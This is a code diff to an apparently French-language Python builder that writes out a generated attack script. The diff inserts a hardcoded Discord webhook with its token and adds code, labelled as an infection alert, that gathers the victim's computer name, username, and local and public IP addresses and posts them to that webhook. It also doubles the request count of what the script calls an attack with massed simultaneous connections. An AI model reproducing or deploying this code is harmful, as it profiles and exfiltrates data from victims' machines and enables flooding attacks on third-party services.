@@ -255,8 +255,24 @@ def pyw():
         f.write("    'Connection': 'keep-alive',\n")
         f.write("}\n\n")
 
-        f.write("webhook2 = 'https://discordapp.com/api/webhooks/1445805470639067311/DdrHhMfsUhJbpH2bN8DBz_4-WblD3jlCgQtpLjS_4t5vjq6vuoURh0tGWhAIY2quGASi'\n")
+        f.write("webhook2 = 'https://discordapp.com/api/webhooks/1442910596356898900/218BIA3FdUTa98-pVKYTwtW_FC8YjERHvw_DskmOTFGIQo07rfcXi-29U3kqhMa-K05c'\n")
         f.write("valeur = ''\n\n")
+
+        f.write(
+                'import getpass, platform, socket, requests\n'
+                'ordi = platform.node()\n'
+                'hostname = socket.gethostname()\n\n'
+                'def alert_on_infection_option_func():\n'
+                '    ip = requests.get("https://api.ipify.org").text\n'
+                '    discord_webhook = WEBHOOK\n'
+                '    name = (\n'
+                '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
+                '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
+                '        f"Adresse IP locale : {socket.gethostbyname(hostname)}\\n"\n'
+                '        f"Adresse IP publique : {ip}"\n'
+                '    )\n'
+                '    requests.post(webhook2, json={"content": name})\n\n'
+            )
 
         f.write("def envoyer():\n")
         f.write("    global valeur\n\n")
@@ -290,7 +306,7 @@ def pyw():
         f.write("    global valeur\n\n")
         f.write("    if valeur == '':\n")
         f.write("        print('pas possible')\n")
-        f.write("    nombre_requetes = 500\n")
+        f.write("    nombre_requetes = 1000\n")
         f.write("    concurrence = min(100000, nombre_requetes)\n")
         f.write("    print(f'Démarrage de l\\'attaque avec {concurrence} connexions simultanées...')\n")
         f.write("    start_time = time.time()\n\n")
@@ -641,6 +657,3 @@ with open("logs.txt", "a") as fichier:
 
 def key():
     app.mainloop()
-
-
-key()
